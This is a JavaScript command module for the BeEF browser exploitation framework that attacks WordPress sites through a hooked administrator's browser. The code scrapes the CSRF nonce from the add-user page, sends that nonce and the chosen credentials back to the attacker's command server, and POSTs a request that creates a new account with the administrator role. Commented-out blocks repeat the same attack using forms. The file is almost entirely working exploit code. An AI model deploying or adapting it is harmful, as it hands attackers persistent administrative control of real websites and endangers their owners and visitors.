//
// Copyright (c) 2015 Daniel Reece - @HBRN8 - danielre@uk.ibm.com
//

beef.execute(function() {

function g(u){ x=new XMLHttpRequest(); x.open('GET',u,false); x.send(null); return x.responseText; }
function p(u, b){ x=new XMLHttpRequest(); x.open('POST',u,true); x.setRequestHeader("Content-type","application/x-www-form-urlencoded"); x.send(b); return x.responseText; }
/* Kept incase there is a valid reason to use forms over AJAX, I cant think of any.
function post(path, params, method) {
    method = method || "post";
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);
            form.appendChild(hiddenField);
         }
    }
    document.body.appendChild(form);
    form.submit();
}
*/

var domail = '<%= @domail %>';

page = g("/wp-admin/user-new.php");

m = page.match(/\-user" value="(.*?)" \/><input/);	
	
beef.net.send("<%= @command_url %>", <%= @command_id %>, "CSRF nonce hijacked = " + m[1] + 
"\nCreating admin... (<%== format_multiline(@user + ':' + @pass) %>)");

var blob = "action=createuser" +
"&_wpnonce_create-user=" + m[1] +
"&_wp_http_referer=%2Fwp-admin%2Fuser-new.php" +
"&user_login=<%== format_multiline(@user) %>" +
"&email=<%== format_multiline(@email) %>" +
"&first_name=<%== format_multiline(@fname) %>" +
"&last_name=<%== format_multiline(@lname) %>" +
"&url=<%== format_multiline(@url) %>" +
"&pass1=<%== format_multiline(@pass) %>" +
"&pass2=<%== format_multiline(@pass) %>";
if (domail){
//Wordpress will mail regardless of param value if it exists.
blob = blob + "&send_password=1";
}
blob = blob + "&role=administrator&createuser=Add+New+User";

p("/wp-admin/user-new.php", blob);

/* Still cant think of any.
post('/wp-admin/user-new.php', 
{action: 'createuser', 
 '_wpnonce_create-user': m[1],
 _wp_http_referer: '%2Fwp-admin%2Fuser-new.php', 
 user_login: '<%== format_multiline(@user) %>',
 email: '<%== format_multiline(@email) %>', 
 first_name: '<%== format_multiline(@fname) %>', 
 last_name: '<%== format_multiline(@lname) %>',
 url: '<%== format_multiline(@url) %>',
 pass1: '<%== format_multiline(@pass) %>', 
 pass2: '<%== format_multiline(@pass) %>', 
 send_password: '1', 
 role: 'administrator', 
 createuser: 'Add+New+User+'});
*/
	
});